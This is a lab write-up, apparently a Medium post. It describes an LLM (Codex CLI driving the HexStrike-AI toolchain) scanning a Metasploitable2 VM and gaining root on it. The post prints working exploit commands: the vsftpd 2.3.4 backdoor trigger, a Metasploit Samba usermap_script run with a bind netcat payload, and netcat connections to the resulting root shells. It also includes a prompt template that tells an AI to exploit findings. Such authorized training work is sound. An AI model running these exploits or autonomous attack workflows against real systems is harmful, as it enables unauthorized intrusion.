---
title: "OpenAI Codex Integration"
date: 2026-01-03
sidebar_position: 3
---

:::info Last tested
Kali Linux 2025.4 · HexStrike AI (Kali package 2025.4 repo) · May 2026. Results may vary on other versions.
:::


# HexStrike+OpenAI Codex. AI-Driven Exploitation of Metasploitable.

How I Used an LLM-Orchestrated Toolchain to Enumerate and Exploit a Deliberately Vulnerable Host (With Real Proofs) 

* * *

### HexStrike+OpenAI Codex. AI-Driven Exploitation of Metasploitable.

#### How I Used an LLM-Orchestrated Toolchain to Enumerate and Exploit a Deliberately Vulnerable Host (With Real Proofs)

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-ryG5h9VfySviXapLEyOSvg.png)

### Introduction

AI-assisted penetration testing is no longer a concept — it is operational reality.

In this article, I walk through a **real, authorized** penetration test against my own lab host running **Metasploitable2**. I used an LLM-driven workflow (Codex CLI) orchestrating tool execution through **HexStrike-AI** to perform:

  * network discovery
  * enumeration and service fingerprinting
  * exploit selection and execution
  * proof collection (root-level command output)



This was not a simulation.

Real tools were executed.  
Real vulnerabilities were validated.  
And the target was compromised with **unauthenticated root access** — twice — via two independent attack paths.

* * *

#### Core Guides and Setup

[**HexStrike on Kali Linux 2025.4: A Comprehensive Guide**](<https://medium.com/ai-security-hub/hexstrike-on-kali-linux-2025-4-a-comprehensive-guide-85a0e5752949>)

  *  _Focus: Initial setup and overview of the AI-powered offensive security framework._



[**HexStrike-AI: A Force Multiplier for Red Teams — and a Dangerous Shift in the Threat Landscape**](<https://medium.com/@1200km/hexstrike-ai-a-force-multiplier-for-red-teams-and-a-dangerous-shift-in-the-threat-landscape-0678d8a632e1>)

  *  _Focus: Analysis of AI-orchestrated pentesting and its implications._



[**HexStrike MCP Orchestration with Ollama: Ubuntu Host, Kali VM, SSH Bridging, and Performance…**](<https://medium.com/@1200km/hexstrike-mcp-orchestration-with-ollama-ubuntu-host-kali-vm-ssh-bridging-and-performance-318a803730e7>)

  *  _Focus: Technical architecture using Model Context Protocol (MCP) and local LLMs._



#### Practical Applications & Lab Comparisons

[**HexStrike + Gemini vs. HackerAI: “Ops Copilot” vs. “Chatbot with Tools”**](<https://medium.com/@1200km/hexstrike-gemini-vs-hackerai-ops-copilot-vs-chatbot-with-tools-000c28303867>)

  *  _Focus: Practical lab comparison of orchestration quality between different AI security tools._



[**AI-Driven Pentesting at Home: Using HexStrike-AI for Full Network Discovery and Exploitation**](<https://medium.com/@1200km/ai-driven-pentesting-at-home-using-hexstrike-ai-for-full-network-discovery-and-exploitation-8a602d29528d>)

  *  _Focus: Step-by-step home lab application for network enumeration._



#### Specific Tooling & Technique Guides

  * [**AI-Driven Web Application Pentesting with HexStrike-AI**](<https://medium.com/@1200km/ai-driven-web-application-pentesting-with-hexstrike-ai-961906961445>)
  * [**Integrating Shodan with HexStrike-AI Using Gemini-CLI**](<https://medium.com/@1200km/integrating-shodan-with-hexstrike-ai-using-gemini-cli-a18544c0649f>)
  * [**AI-Driven Wireless Penetration Testing. One Prompt WIFI cracking**](<https://medium.com/@1200km/ai-driven-wireless-penetration-testing-one-promt-wifi-cracking-16c80537237e>) (Using HexStrike-AI)
  * [**AI-Driven Office Documents Password Recovery with HexStrike-AI and Gemini-CLI**](<https://medium.com/@1200km/ai-driven-office-documents-password-recovery-with-hexstrike-ai-and-gemini-cli-4f1146747190>)
  * [**AI-Driven PDF Password Recovery with HexStrike-AI and Gemini-CLI**](<https://medium.com/@1200km/ai-driven-pdf-password-recovery-with-hexstrike-ai-and-gemini-cli-6e2101348873>)
  * [**AI-Driven ZIP Password Recovery with HexStrike-AI and Gemini-CLI**](<https://medium.com/@1200km/ai-driven-zip-password-recovery-with-hexstrike-ai-and-gemini-cli-9f37397b2756>)



* * *

### What Is HexStrike-AI?

HexStrike-AI is not “another scanner.”

It is an orchestration layer that lets an LLM:

  * decide what security tools to run
  * execute them locally (or via SSH/MCP)
  * interpret outputs
  * adapt strategy dynamically (timeouts, missing tools, privilege constraints)
  * optionally run controlled exploitation with PoC evidence



In short:

**The AI plans. HexStrike executes. Kali delivers the tools.**

* * *

### Test Scope & Authorization

This assessment was conducted under explicit authorization.

### Scope

  * **Target:** `172.16.163.129`
  * **Environment:** private home lab (Metasploitable2 VM)
  * **Attacker:** Kali Linux environment with Codex CLI + HexStrike MCP

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-2tkO21QPoKIaAHV2GLTiXg.png)

* * *

### The Prompt That Started Everything

This is the “pattern” that makes LLM-driven pentesting actually work: you must demand **execution + evidence**.

Example prompt structure (adapt it to your CLI):
    
    
    Use the MCP server "hexstrike": Authorized pentest of 172.16.163.129  
    Full service discovery  
    Enumerate versions  
    Identify vulnerabilities (by severity)  
    Exploit critical findings  
    Provide proofs (command output)

Key lesson:  
**If you want HexStrike to run tools, explicitly require tool execution and proof artifacts.**

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-eABegFDYfVOV0X7OTkDnxA.png)

* * *

### Phase 1: Reachability and Discovery

The first attempt targeted a wrong IP (`172.16.59.129`) and resulted in “host seems down.”

After correcting to:

  * `172.16.163.129`



The host responded immediately.

A fast top-ports discovery scan confirmed the target was up and exposed a broad attack surface.

* * *

### Phase 2: Enumeration & Service Fingerprinting

Because the environment had constraints (root privileges not always available, tool timeouts), the workflow adapted:

  * switched from SYN scan (`-sS`) to TCP connect (`-sT`)
  * used bounded host timeouts
  * reduced version intensity when needed



#### Confirmed exposed services (high-level)

The target exposed multiple legacy services typical of Metasploitable2:

  * **FTP (21)**
  * **SSH (22)**
  * **Telnet (23)**
  * **SMTP (25)**
  * **DNS (53)**
  * **HTTP (80)**
  * **RPCbind (111)**
  * **SMB (139/445)**
  * **rlogin/rsh (513/514)**
  * **NFS (2049)**
  * **FTP alt (2121)**
  * **MySQL (3306)**
  * **PostgreSQL (5432)**
  * **VNC (5900)**
  * **X11 (6000)**
  * **AJP (8009)**

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-M-KtDpNJKOmzKguYuZsk3A.png)

#### Host identity confirmation

The HTTP landing page provided a definitive marker:
    
    
    curl -s http://172.16.163.129:80 | head -n 5

Output included:

  * `<title>Metasploitable2 - Linux</title>`



At this point, the test shifted from “general assessment” to “known vulnerable image validation” — meaning we should expect multiple published RCE paths.

* * *

### Phase 3: Vulnerability Discovery (What Stood Out Immediately)

Two services were immediate critical flags due to **known RCE history** in this lab image:

  1. **vsftpd 2.3.4** (commonly backdoored in lab builds)
  2. **Samba 3.0.20** (classic usermap_script RCE path)



Rather than listing every CVE possible for every old service, the workflow focused on:

  * vulnerabilities with **direct, reliable exploitability**
  * minimal risk of destabilizing the host
  * clear PoC output validation

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-i537IaV4nzH-Yl0WAUFAbA.png)

* * *

### Phase 4: Exploitation (With Proofs)

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-Cwm_odt5ix6oogYUhn6w-Q.png)

#### Exploit #1 — vsftpd 2.3.4 backdoor (CVE-2011–2523) → Root

#### Why it worked

In the Metasploitable2 build, vsftpd is intentionally vulnerable. A crafted username containing `:)` triggers a backdoor listener (commonly on TCP/6200).

#### Step A — Trigger the backdoor
    
    
    (printf "USER test:)\r\nPASS test\r\nQUIT\r\n"; sleep 1) | nc -nv -w 2 172.16.163.129 21

This confirmed:

  * FTP reachable
  * banner: `220 (vsFTPd 2.3.4)`



#### Step B — Connect to backdoor shell and capture proof
    
    
    printf "id\nuname -a\nwhoami\npwd\n" | nc -nv -w 3 172.16.163.129 6200

**Proof (captured output):**
    
    
     uid=0(root) gid=0(root)  
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux  
    root  
    /

**Impact:** Unauthenticated Remote Code Execution → **root**.

No persistence was deployed. No further actions were taken.

* * *

#### Exploit #2 — Samba usermap_script (CVE-2007–2447) → Root bind shell

#### Why it worked

Samba 3.0.20 has a well-known remote command execution vulnerability via the username map script feature. Metasploit automates exploitation.

#### Tooling nuance: why a bind shell was used

The first Metasploit run produced unstable command shell behavior (sessions closing quickly and command execution differences between session types). The workflow pivoted to a **bind shell payload** , which is often more reliable in constrained environments.

#### Step A — Launch exploit with bind netcat payload (binds on port 4446)
    
    
    msfconsole -q -x 'use exploit/multi/samba/usermap_script; \  
    set RHOSTS 172.16.163.129; set RPORT 139; \  
    set payload cmd/unix/bind_netcat; \  
    set LPORT 4446; set DisablePayloadHandler true; \  
    exploit -z; exit -y'

#### Step B — Connect to bind shell and capture proof
    
    
    printf "id\nuname -a\nwhoami\npwd\n" | nc -nv -w 3 172.16.163.129 4446

**Proof (captured output):**
    
    
     uid=0(root) gid=0(root)  
    Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux  
    root  
    /

**Impact:** Unauthenticated Remote Code Execution → **root**.

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-4DkOtawu-LswnG3baLupuA.png)

* * *

### Final Results Summary

#### What was validated

  * Broad service exposure consistent with Metasploitable2
  * **Two separate unauthenticated root compromises** , each independently sufficient for full takeover:
  * vsftpd backdoor (TCP/6200)
  * Samba usermap_script (bind shell on TCP/4446)

![](/img/hexstrike-articles/hexstrike-openai-codex-ai-driven-exploitation-of-metasploitable/1-upLkdxiWzfTbKmUNw6A5rg.png)

#### What was intentionally not done

  * No persistence / backdoors
  * No credential harvesting
  * No data collection beyond proof commands
  * No lateral movement testing



This kept the test strictly PoC-focused.

* * *

### Remediation Recommendations (Real-World Perspective)

Metasploitable2 is intentionally insecure. In real systems, the remediation playbook is clear.

#### Critical

  * Remove backdoored/vulnerable services immediately
  * Never expose training VMs on networks shared with real assets
  * Enforce segmentation (lab VLAN / host-only networks)



#### High

  * Remove legacy cleartext and trust-based services:
  * Telnet
  * rsh/rlogin
  * VNC / X11 (unless strictly controlled)
  * Restrict SMB exposure and enforce modern versions/configs



#### Medium

  * Disable obsolete crypto (SSLv2) and weak ciphers
  * Remove version banners and harden HTTP stack
  * Restrict AJP to localhost/internal networks only



#### Low

  * Reduce attack surface: firewall by default, allowlist by source
  * Continuous inventory and exposure monitoring



* * *

### Why This Matters

This test highlights the real value of AI in offensive workflows:

AI did not “replace” pentesting skills.  
It **amplified** them.

The LLM-driven workflow:

  * selected practical next steps
  * adapted to missing tools and privilege constraints
  * pivoted when sessions were unstable
  * still produced clean PoC artifacts



The operator still matters — but the **mental overhead drops sharply**.

* * *

### Final Thoughts

HexStrike-AI is not a toy. Used correctly, it behaves like a junior pentester with perfect memory and infinite patience — executing exactly what you instruct and iterating until it gets results.

By [Andrey Pautov](<https://medium.com/@1200km>) on [January 3, 2026](<https://medium.com/p/b892c07be39f>).

[Canonical link](<https://medium.com/@1200km/ai-driven-exploitation-of-metasploitable2-from-recon-to-root-with-codex-hexstrike-ai-b892c07be39f>)

Exported from [Medium](<https://medium.com>) on May 15, 2026.
